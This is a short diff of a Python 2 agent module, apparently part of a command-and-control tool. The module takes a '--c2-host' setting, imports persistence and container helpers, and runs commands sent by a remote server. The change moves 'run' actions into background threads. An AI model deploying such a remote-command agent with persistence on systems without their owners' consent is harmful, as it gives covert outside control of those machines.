@@ -7,6 +7,7 @@ import json
 import socket
 import fcntl
 import struct
+from threading import Thread
 from .rest import Rester
 from .lib.persistance import PersistenceMGMT
 from .lib.containers import ContainerMGMT
@@ -19,9 +20,6 @@ except ImportError as e:
     print "psutil is not installed. Note that GCC is a dependency of psutil. Re-run the Agent installation command to " \
           "attempt installation of psutil and auto-configure the agent"
 
-
-
-
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
@@ -31,6 +29,7 @@ def parse_args():
     parser.add_argument('--no-ssl', action='store_false', dest='ssl', help="Turn SSL usage off")
     args = parser.parse_args()
     return args
+
 
 def update_config(db, args):
     if args.host:
@@ -83,7 +82,11 @@ def exec_cmd(cmd, cmd_id):
     action = cmd["action"]
     if action in verbs:
         func = verbs[action]
-        func(cmd)
+        if action == "run":
+            t = Thread(target=func, args=(cmd,))
+            t.start()
+        else:
+            func(cmd)
     rest.commandComplete(cmd_id)
 
 
